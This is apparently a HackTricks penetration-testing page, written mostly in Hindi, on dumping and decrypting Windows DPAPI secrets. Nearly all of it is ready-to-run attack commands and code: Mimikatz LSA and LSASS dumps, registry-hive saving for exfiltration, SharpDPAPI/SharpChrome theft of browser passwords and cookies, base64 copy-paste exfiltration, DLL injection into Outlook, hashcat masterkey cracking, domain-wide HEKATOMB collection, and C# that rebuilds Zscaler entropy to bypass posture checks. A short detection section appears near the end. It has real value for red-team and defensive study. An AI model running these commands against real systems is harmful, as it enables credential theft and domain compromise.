# DPAPI - पासवर्ड निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

The Data Protection API (DPAPI) का मुख्य उपयोग Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric encryption के लिए किया जाता है, जो entropy के स्रोत के रूप में या तो user या system secrets का उपयोग करता है। यह तरीका डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है क्योंकि इससे वे उस कुंजी का उपयोग करके डेटा एन्क्रिप्ट कर सकते हैं जो user के logon secrets से व्युत्पन्न होती है, या system एन्क्रिप्शन के लिए system के domain authentication secrets से — इस तरह डेवलपर को एन्क्रिप्शन कुंजी की सुरक्षा स्वयं प्रबंधित करने की आवश्यकता नहीं रहती।

सबसे सामान्य तरीका DPAPI का उपयोग करने का है **`CryptProtectData` and `CryptUnprotectData`** functions के माध्यम से, जो applications को उस प्रोसेस के वर्तमान लॉगऑन सेशन के साथ सुरक्षित रूप से डेटा एन्क्रिप्ट और डिक्रिप्ट करने की अनुमति देते हैं। इसका मतलब है कि एन्क्रिप्ट किया गया डेटा केवल वही user या system द्वारा डिक्रिप्ट किया जा सकता है जिसने इसे एन्क्रिप्ट किया था।

इसके अलावा, ये functions एक **`entropy` parameter** भी स्वीकार करते हैं जिसे एन्क्रिप्शन और डिक्रिप्शन के दौरान भी उपयोग किया जाएगा, इसलिए यदि किसी चीज़ को इस parameter का उपयोग करके एन्क्रिप्ट किया गया है तो उसे डिक्रिप्ट करने के लिए आपको वही entropy value प्रदान करनी होगी जो एन्क्रिप्शन के दौरान उपयोग की गई थी।

### उपयोगकर्ता कुंजी निर्माण

DPAPI प्रत्येक उपयोगकर्ता के लिए एक अद्वितीय कुंजी (जिसे **`pre-key`** कहा जाता है) उत्पन्न करता है। यह कुंजी उपयोगकर्ता के पासवर्ड और अन्य फैक्टर से व्युत्पन्न होती है और एल्गोरिथ्म user के प्रकार पर निर्भर करता है पर अंततः यह SHA1 में समाप्त होता है। उदाहरण के लिए, domain users के लिए **यह user के NTLM hash पर निर्भर करता है**।

यह विशेष रूप से दिलचस्प है क्योंकि यदि कोई हमलावर उपयोगकर्ता का password hash प्राप्त कर लेता है, तो वह कर सकता है:

- **उस user की कुंजी का उपयोग करके किसी भी डेटा को डिक्रिप्ट करें जिसे DPAPI से एन्क्रिप्ट किया गया था** बिना किसी API से संपर्क किए
- ऑफ़लाइन valid DPAPI key जेनरेट करने की कोशिश करके **पासवर्ड को क्रैक करने** का प्रयास करें

इसके अलावा, हर बार जब कोई उपयोगकर्ता DPAPI का उपयोग करके कुछ डेटा एन्क्रिप्ट करता है, तो एक नया **master key** जनरेट किया जाता है। यही master key वास्तव में डेटा एन्क्रिप्ट करने के लिए उपयोग किया जाता है। प्रत्येक master key को पहचाने जाने के लिए एक **GUID** (Globally Unique Identifier) दिया जाता है।

master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** डायरेक्टरी में स्टोर होते हैं, जहाँ `{SID}` उस उपयोगकर्ता का Security Identifier है। master key को उपयोगकर्ता के **`pre-key`** द्वारा एन्क्रिप्ट करके और recovery के लिए एक **domain backup key** द्वारा भी एन्क्रिप्ट करके स्टोर किया जाता है (तो वही कुंजी 2 अलग-अलग पास से 2 बार एन्क्रिप्ट होकर स्टोर होती है)।

ध्यान दें कि **master key को एन्क्रिप्ट करने के लिए उपयोग की गई domain key domain controllers में रहती है और कभी नहीं बदलती**, इसलिए यदि किसी हमलावर के पास domain controller तक पहुँच है, तो वह domain backup key पुनः प्राप्त कर सकता है और डोमेन के सभी उपयोगकर्ताओं की master keys को डिक्रिप्ट कर सकता है।

एन्क्रिप्टेड blobs अपने हेडर में उस master key का **GUID** रखते हैं जिसका उपयोग डेटा को एन्क्रिप्ट करने के लिए किया गया था।

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### मशीन/सिस्टम कुंजी निर्माण

यह वह कुंजी है जिसका उपयोग मशीन द्वारा डेटा एन्क्रिप्ट करने के लिए किया जाता है। यह **DPAPI_SYSTEM LSA secret** पर आधारित है, जो एक विशेष कुंजी है जिसे केवल SYSTEM उपयोगकर्ता ही एक्सेस कर सकता है। यह कुंजी उन डेटा को एन्क्रिप्ट करने के लिए उपयोग होती है जिन्हें सिस्टम स्वयं द्वारा पहुँचा जाना जरूरी होता है, जैसे machine-level credentials या system-wide secrets।

ध्यान दें कि इन कुंजियों का **domain backup मौजूद नहीं होता**, इसलिए वे केवल स्थानीय रूप से ही पहुँच योग्य हैं:

- **Mimikatz** इन तक पहुँच सकता है; LSA secrets निकालने के लिए इस कमांड का उपयोग करें: `mimikatz lsadump::secrets`
- यह secret registry के अंदर स्टोर होता है, इसलिए एक administrator इसे एक्सेस करने के लिए **DACL permissions संशोधित कर सकता है**। रजिस्ट्री पथ है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hives से offline extraction भी संभव है। उदाहरण के लिए, लक्ष्य पर administrator के रूप में hives को सेव करके उन्हें exfiltrate करें:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
फिर अपनी विश्लेषण मशीन पर, हाइव्स से DPAPI_SYSTEM LSA secret पुनः प्राप्त करें और इसे machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, आदि) को डिक्रिप्ट करने के लिए उपयोग करें:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कम्प्लीशन डेटा
- Outlook और Windows Mail जैसे एप्लिकेशन के लिए ई-मेल और internal FTP अकाउंट पासवर्ड
- shared folders, resources, wireless networks, और Windows Vault के लिए पासवर्ड, जिसमें encryption keys भी शामिल हैं
- remote desktop connections, .NET Passport, और विभिन्न encryption और authentication प्रयोजनों के लिए private keys के पासवर्ड
- Credential Manager द्वारा प्रबंधित network passwords और CryptProtectData का उपयोग करने वाले एप्लिकेशन (जैसे Skype, MSN messenger आदि) में निजी डेटा
- रजिस्ट्री के अंदर encrypted blobs
- ...

सिस्टम द्वारा संरक्षित डेटा में शामिल हैं:
- Wifi पासवर्ड
- Scheduled task पासवर्ड
- ...

### Master key निकालने के विकल्प

- यदि उपयोगकर्ता के पास domain admin privileges हैं, तो वे **domain backup key** तक पहुँच सकते हैं ताकि डोमेन में सभी उपयोगकर्ता master keys को decrypt किया जा सके:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- With local admin privileges, यह संभव है कि **LSASS memory तक पहुँच** कर सभी जुड़े हुए उपयोगकर्ताओं के DPAPI master keys और SYSTEM key निकाले जा सकते हैं।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि उपयोगकर्ता के पास स्थानीय admin privileges हैं, तो वे मशीन मास्टर कुंजियों को डिक्रिप्ट करने के लिए **DPAPI_SYSTEM LSA secret** तक पहुँच सकते हैं:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि उपयोगकर्ता का password या NTLM hash ज्ञात हो, तो आप उपयोगकर्ता की **master keys को सीधे decrypt कर सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- अगर आप user के रूप में एक session के अंदर हैं, तो DC से **backup key to decrypt the master keys using RPC** के लिए पूछना संभव है। अगर आप local admin हैं और user logged in है, तो आप इसके लिए **steal his session token** कर सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## वॉल्ट सूची
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI एन्क्रिप्टेड डेटा तक पहुँच

### DPAPI एन्क्रिप्टेड डेटा खोजें

सामान्य उपयोगकर्ताओं की **रक्षित फ़ाइलें** इन स्थानों में होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए पथों में `\Roaming\` को `\Local\` में बदलकर भी देखें।

एन्यूमरेशन के उदाहरण:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) फाइल सिस्टम, रजिस्ट्री और B64 blobs में DPAPI encrypted blobs ढूँढ सकता है:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी repo से) DPAPI का उपयोग करके cookies जैसे संवेदनशील डेटा को डिक्रिप्ट करने के लिए उपयोग किया जा सकता है।

#### Chromium/Edge/Electron त्वरित नुस्खे (SharpChrome)

- Current user, सहेजे गए logins/cookies का इंटरैक्टिव डिक्रिप्शन (यह Chrome 127+ app-bound cookies के साथ भी काम करता है क्योंकि अतिरिक्त कुंजी उपयोगकर्ता के Credential Manager से प्राप्त कर ली जाती है जब इसे user context में चलाया जाता है):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ऑफ़लाइन विश्लेषण जब आपके पास केवल फाइलें हों। सबसे पहले प्रोफ़ाइल के "Local State" से AES state key निकालें और फिर उसे cookie DB को decrypt करने के लिए उपयोग करें:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- डोमेन-व्यापी/remote triage जब आपके पास लक्षित होस्ट पर DPAPI डोमेन बैकअप कुंजी (PVK) और admin हों:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- यदि आपके पास किसी user का DPAPI prekey/credkey (LSASS से) है, तो आप password cracking को छोड़कर सीधे decrypt profile data कर सकते हैं:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
नोट्स
- नए Chrome/Edge builds कुछ cookies को "App-Bound" encryption का उपयोग करके स्टोर कर सकते हैं। उन विशिष्ट cookies का ऑफ़लाइन डिक्रिप्शन अतिरिक्त app-bound key के बिना संभव नहीं है; इसे स्वचालित रूप से प्राप्त करने के लिए SharpChrome को लक्षित उपयोगकर्ता संदर्भ में चलाएँ। नीचे संदर्भित Chrome security ब्लॉग पोस्ट देखें।

### एक्सेस कुंजियाँ और डेटा

- **SharpDPAPI का उपयोग करें** वर्तमान सत्र की DPAPI एन्क्रिप्टेड फ़ाइलों से क्रेडेंशियल प्राप्त करने के लिए:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **क्रेडेंशियल जानकारी प्राप्त करें** जैसे एन्क्रिप्टेड डेटा और guidMasterKey।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **मास्टरकीज़ तक पहुँच**:

RPC का उपयोग करके उस उपयोगकर्ता की एक masterkey डिक्रिप्ट करें जिसने **domain backup key** का अनुरोध किया है:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** टूल masterkey decryption के लिए इन arguments का भी समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग domains backup key प्राप्त करने के लिए किया जा सकता है, `/password` का उपयोग plaintext password के लिए किया जा सकता है, या `/pvk` के साथ DPAPI domain private key file निर्दिष्ट करने के लिए किया जा सकता है...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey का उपयोग करके डेटा को Decrypt करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` को डिक्रिप्ट करने के लिए इन आर्गुमेंट्स का भी समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग डोमेन के बैकअप कुंजी प्राप्त करने के लिए संभव है, `/password` का उपयोग plaintext password के लिए, `/pvk` द्वारा DPAPI डोमेन प्राइवेट की फ़ाइल निर्दिष्ट करने के लिए, `/unprotect` द्वारा वर्तमान उपयोगकर्ता के सत्र का उपयोग करने के लिए...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey को सीधे इस्तेमाल करना (कोई password आवश्यक नहीं)

यदि आप LSASS को dump कर सकते हैं, तो Mimikatz अक्सर एक per-logon DPAPI key को उजागर करता है, जिसे user के masterkeys को plaintext password जाने बिना decrypt करने के लिए इस्तेमाल किया जा सकता है। इस value को सीधे tooling को पास करें:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके कुछ डेटा डिक्रिप्ट करें:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py के साथ ऑफ़लाइन डिक्रिप्शन

यदि आपके पास पीड़ित उपयोगकर्ता का SID और password (या NT hash) है, तो आप DPAPI masterkeys और Credential Manager blobs को पूरी तरह से ऑफ़लाइन Impacket के dpapi.py का उपयोग करके डिक्रिप्ट कर सकते हैं।

- डिस्क पर आर्टिफैक्ट्स की पहचान करें:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- यदि फ़ाइल ट्रांसफ़र टूलिंग अविश्वसनीय है, तो फ़ाइलों को ऑन-होस्ट base64 करें और आउटपुट कॉपी करें:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- उपयोगकर्ता के SID और password/hash के साथ masterkey को डिक्रिप्ट करें:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- decrypted masterkey का उपयोग credential blob को decrypt करने के लिए करें:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
यह कार्यप्रवाह अक्सर Windows Credential Manager का उपयोग करने वाले apps द्वारा सहेजे गए domain credentials को पुनर्प्राप्त कर लेता है, जिसमें प्रशासनिक खाते शामिल हैं (e.g., `*_adm`)।

---

### वैकल्पिक एंट्रॉपी ("Third-party entropy") को संभालना

कुछ applications अतिरिक्त **entropy** मान `CryptProtectData` को पास करते हैं। इस मान के बिना blob को डिक्रिप्ट नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इस तरह संरक्षित credentials को लक्षित करते समय entropy प्राप्त करना इसलिए आवश्यक है (उदाहरण के लिए Microsoft Outlook, कुछ VPN clients)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है जो target process के अंदर DPAPI फ़ंक्शन्स को hook करता है और प्रदान की गई किसी भी optional entropy को पारदर्शी रूप से रिकॉर्ड करता है। EntropyCapture को **DLL-injection** मोड में `outlook.exe` या `vpnclient.exe` जैसे processes के खिलाफ चलाने पर यह प्रत्येक entropy buffer को कॉल करने वाले process और blob से मैप करने वाली एक फ़ाइल आउटपुट करेगा। कैप्चर्ड entropy बाद में डेटा को डिक्रिप्ट करने के लिए **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को प्रदान की जा सकती है।
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### ऑफ़लाइन masterkeys क्रैक करना (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से शुरू होकर **context 3** masterkey फ़ॉर्मेट पेश किया। `hashcat` v6.2.6 (December 2023) में hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) और **22102** (context 3) जो उपयोगकर्ता पासवर्ड्स को masterkey फ़ाइल से सीधे GPU-accelerated तरीके से क्रैक करने की अनुमति देते हैं। इसलिए हमलावर बिना लक्षित सिस्टम के साथ इंटरैक्ट किए word-list या brute-force attacks कर सकते हैं।

`DPAPISnoop` (2024) इस प्रक्रिया को automate करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
यह टूल भी Credential और Vault blobs को पार्स कर सकता है, इन्हें cracked keys से decrypt कर सकता है और cleartext passwords को export कर सकता है।

### अन्य मशीन का डेटा एक्सेस करें

In **SharpDPAPI and SharpChrome** आप दूरस्थ मशीन के डेटा तक पहुंचने के लिए **`/server:HOST`** विकल्प का उपयोग कर सकते हैं। बेशक आपको उस मशीन तक पहुँच होना चाहिए और निम्न उदाहरण में यह माना गया है कि **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## अन्य उपकरण

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक टूल है जो LDAP डायरेक्टरी से सभी users और computers को एक्सट्रैक्ट करने और RPC के माध्यम से domain controller backup key निकालने को ऑटोमेट करता है। स्क्रिप्ट फिर सभी कंप्यूटरों के IP पते रिज़ॉल्व करेगी और सभी कंप्यूटरों पर smbclient चला कर सभी users के DPAPI blobs प्राप्त करेगी और domain backup key से सब कुछ डिक्रिप्ट कर देगी।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली गई कंप्यूटर सूची के साथ आप हर सबनेट ढूंढ सकते हैं भले ही आप उन्हें पहले न जानते हों!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI द्वारा protec्ट किए गए secrets को स्वचालित रूप से dump कर सकता है। 2.x रिलीज़ ने ये सुविधाएँ जोड़ीं:

* सैकड़ों होस्ट्स से blobs का parallel collection
* **context 3** masterkeys का parsing और automatic Hashcat cracking integration
* Chrome "App-Bound" encrypted cookies के लिए सपोर्ट (घटक देखें)
* एक नया **`--snapshot`** मोड जो endpoints को बार-बार पोल कर नए बने blobs का diff देता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault फ़ाइलों के लिए एक C# पार्सर है जो Hashcat/JtR फॉर्मैट आउटपुट कर सकता है और वैकल्पिक रूप से cracking स्वतः चालू कर सकता है। यह Windows 11 24H1 तक के machine और user masterkey फॉर्मैट्स को पूरी तरह सपोर्ट करता है।


## सामान्य पता लगाने के तरीके

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित डायरेक्टरीज़ में फ़ाइलों तक पहुंच।
- विशेष रूप से नेटवर्क शेयर जैसे **C$** या **ADMIN$** से।
- LSASS मेमोरी तक पहुँचने या masterkeys dump करने के लिए **Mimikatz**, **SharpDPAPI** या समान टूलिंग का उपयोग।
- Event **4662**: *An operation was performed on an object* – इसे **`BCKUPKEY`** ऑब्जेक्ट तक पहुंच के साथ correlate किया जा सकता है।
- Event **4673/4674** जब कोई प्रोसेस *SeTrustedCredManAccessPrivilege* (Credential Manager) का अनुरोध करता है

---
### 2023-2025 कमजोरियाँ और इकोसिस्टम में बदलाव

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (नवंबर 2023). नेटवर्क एक्सेस वाले हमलावर एक domain सदस्य को भ्रामक DPAPI backup key प्राप्त करने के लिए धोखा दे सकते थे, जिससे user masterkeys को डिक्रिप्ट करना संभव हो जाता था। यह नवंबर 2023 के cumulative update में patch किया गया था — प्रशासकों को सुनिश्चित करना चाहिए कि DCs और वर्कस्टेशन्स पूरी तरह patched हों।
* **Chrome 127 “App-Bound” cookie encryption** (जुलाई 2024) ने legacy DPAPI-only सुरक्षा की जगह एक अतिरिक्त key जोड़ी जो user के **Credential Manager** के तहत स्टोर होती है। अब cookies का offline decryption दोनों की आवश्यकता रखता है: DPAPI masterkey और **GCM-wrapped app-bound key**। SharpChrome v2.3 और DonPAPI 2.x अतिरिक्त key को user context में रन होने पर रिकवर कर सकते हैं।


### केस स्टडी: Zscaler Client Connector – SID से व्युत्पन्न कस्टम एंट्रोपी

Zscaler Client Connector कई कॉन्फ़िगरेशन फ़ाइलें `C:\ProgramData\Zscaler` के तहत स्टोर करता है (उदा. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। प्रत्येक फ़ाइल **DPAPI (Machine scope)** के साथ एन्क्रिप्ट है लेकिन vendor एक **कस्टम एंट्रोपी** प्रदान करता है जो डिस्क पर स्टोर करने के बजाय *runtime पर गणना* की जाती है।

एंट्रोपी दो तत्वों से पुनर्निर्मित की जाती है:

1. `ZSACredentialProvider.dll` के अंदर embedded एक hard-coded secret।
2. उस Windows अकाउंट का **SID** जिससे कॉन्फ़िगरेशन संबंधित है।

DLL द्वारा लागू किया गया एल्गोरिथ्म निम्न के बराबर है:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
क्योंकि secret एक DLL में एम्बेड किया गया है जिसे डिस्क से पढ़ा जा सकता है, **any local attacker with SYSTEM rights can regenerate the entropy for any SID** और blobs को offline में decrypt कर सकता है:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
डिक्रिप्शन पूरा JSON कॉन्फ़िगरेशन देता है, जिसमें हर एक **device posture check** और उसका अपेक्षित मान शामिल होता है – ऐसी जानकारी client-side bypasses का प्रयास करते समय बहुत कीमती होती है।

> TIP: अन्य encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI के साथ **without** entropy (`16` zero bytes) से संरक्षित होते हैं। इसलिए SYSTEM privileges प्राप्त होने पर उन्हें सीधे `ProtectedData.Unprotect` से डिक्रिप्ट किया जा सकता है।

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
